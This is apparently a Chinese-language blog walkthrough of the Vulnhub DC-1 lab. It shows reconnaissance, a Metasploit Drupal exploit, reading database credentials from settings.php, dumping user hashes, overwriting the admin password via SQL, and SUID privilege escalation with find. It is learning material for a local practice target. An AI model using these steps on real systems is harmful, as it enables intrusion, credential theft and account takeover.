---
title: Vulnhub DC-1 靶机渗透记录
date: 2026-11-28 00:37:23

---

> 靶机环境仅用于本地学习

| 项目 | 说明 |
|---|---|
| 靶机 | DC-1 (Vulnhub)，IP `192.168.109.158` |
| 攻击机 | Kali Linux，IP `192.168.109.128` |
| 网络模式 | NAT / 仅主机 |

导入靶机后先确认同网段有哪些主机：

```bash
sudo arp-scan -l
```

![arp-scan 结果](image-20261128165428354.png)

**00：50：56开头的是虚拟网关，不用管只有192.168.109.158**

知道了DC-1的IP后开始扫描他的端口，端口是攻击链的起点

可以用nmap去扫描端口

![image-20261128173642533](image-20261128173642533.png)

![image-20261128173920419](image-20261128173920419.png)

```bash
sudo nmap -sV -p- 192.168.109.158
```

![image-20261128174033380](image-20261128174033380.png)

看到了80端口开着http，先去访问一下

```
http://192.168.109.158
```

![image-20261128174240566](image-20261128174240566.png)

已经看到了是drupal，用开发者工具看一下它的版本号是什么

![image-20261128174332698](image-20261128174332698.png)

**cms是文件管理系统**

![image-20261128174416706](image-20261128174416706.png)

知道了版本号我们可以去搜一下它存在的漏洞（exp）

**EXP是漏洞利用程序**

![image-20261128174810611](image-20261128174810611.png)

启动msf

```bash
msfconsole
```

![image-20261128175038542](image-20261128175038542.png)

在msf里搜一下

```bash
search drupal
```

![image-20261128175159401](image-20261128175159401.png)

可以看到第一条和我们刚刚搜索到的drupal7对应的漏洞是一样的

```bash
use 1
```

![image-20261128175327856](image-20261128175327856.png)

查看它的配置

```bash
show options
```

![image-20261128175444013](image-20261128175444013.png)

```bash
set rhosts 192.168.109.158
```

把靶机的IP记录上去

![image-20261128175611625](image-20261128175611625.png)

然后运行

```bash
run
```

![image-20261128175741789](image-20261128175741789.png)

有些命令他不认识

**session 是漏洞利用成功后，metasploit框架为了与目标之间建立一个持久可交互的控制通道所创建的有状态对象**

报错原因：我在meterpreter的命令解释器里，不在bash，meterpreter有自己的一套命令集

所以需要进真正的系统

```bash
shell
```

![image-20261128180813388](image-20261128180813388.png)

可以执行了

我们可以查看当前在哪个目录并列出当前目录下有哪些文件

![image-20261128181017689](image-20261128181017689.png)

可以查看flag1.txt

```bash
cat flag1.txt
```

![image-20261128181058285](image-20261128181058285.png)

每个好的cms都需要一个配置文件，你也是

![image-20261128182932486](image-20261128182932486.png)

我们可以访问一下

```bash
cd /sites/default
cat settings.php
```

![image-20261128183245527](image-20261128183245527.png)

![image-20261128183311196](image-20261128183311196.png)

flag2出来了，下面还有数据库的信息

![image-20261128183507491](image-20261128183507491.png)

我们需要连接数据库

```bash
which mysql
#先看有没有mysql
```

![image-20261128184858130](image-20261128184858130.png)

**刚刚看到的是配置文件里面的数据库的信息，只能说明这个数据库曾经开放过，我不能确保现在还是正常的所以我会判断数据库是否可以正常使用，所以需要看数据库的状态**

```bash
netstat -tlnp | grep 3306
```

![image-20261128185256108](image-20261128185256108.png)

```bash
netstat -tlnp
```

![image-20261128190240716](image-20261128190240716.png)

pty是伪终端

![image-20261128191937020](image-20261128191937020.png)

```bash
python -c 'import pty;pty.spawn("/binbash")'
mysql -u dbuser -p drupaldb
#输密码
R0ck3t
```

![image-20261128192122233](image-20261128192122233.png)

查数据库名

```bash
show databases;
```

![image-20261128192204839](image-20261128192204839.png)

和题目告诉我们的一样

切换到drupaldb这个数据库

```bash
use drupaldb;
show tables;
```

![image-20261128192658045](image-20261128192658045.png)

![image-20261128192728618](image-20261128192728618.png)

```bash
describe users;
```

查看表的结构

![image-20261128193601460](image-20261128193601460.png)

我要看这三个

```bash
select uid,name,pass from users;
```

![image-20261128193649038](image-20261128193649038.png)

$S$DVdWgt9TorkRrMMBQmfFEQYu0ExUAlCZLhPqYeirdHpiAAFWAi5o

这个密码明显就是md5加盐算法

我们可以通过加盐算法把密码给改了

```bash
ls
ls scripts
```

![image-20261128194231141](image-20261128194231141.png)

```bash
./scripts/password-hash.sh admin
```

通过这个password-hash.sh把密码改成admin

![image-20261128194335206](image-20261128194335206.png)

然后去重置密码，让新密码生效

```bash
update users set pass='$S$Dski0oeFPG1psXNUik7hPHVFFyr.qp029iYpGnRtllMjQfls1tiU' where name='admin';
```

![image-20261128195004195](image-20261128195004195.png)

现在以admin/admin的身份去登录

![image-20261128195050689](image-20261128195050689.png)

![image-20261128195220376](image-20261128195220376.png)

![image-20261128195237579](image-20261128195237579.png)

提示我们通过find进行提权

先查看sudo权限

```bash
sudo -l
```

![image-20261128195813922](image-20261128195813922.png)

不能用sudo提权，先找有没有SUID权限

![image-20261128200039914](image-20261128200039914.png)

![image-20261128200213134](image-20261128200213134.png)

```bash
find / -perm -4000 -type f 2>/dev/null
```

![image-20261128200354358](image-20261128200354358.png)

```bash
#-exec的语法
#-exec 命令 参数 \；
```

![image-20261128200736887](image-20261128200736887.png)

![image-20261128201158698](image-20261128201158698.png)

```bash
cd /root
```

![image-20261128201227057](image-20261128201227057.png)

```bash
cat thefinalflag.txt
```

![image-20261128201259927](image-20261128201259927.png)
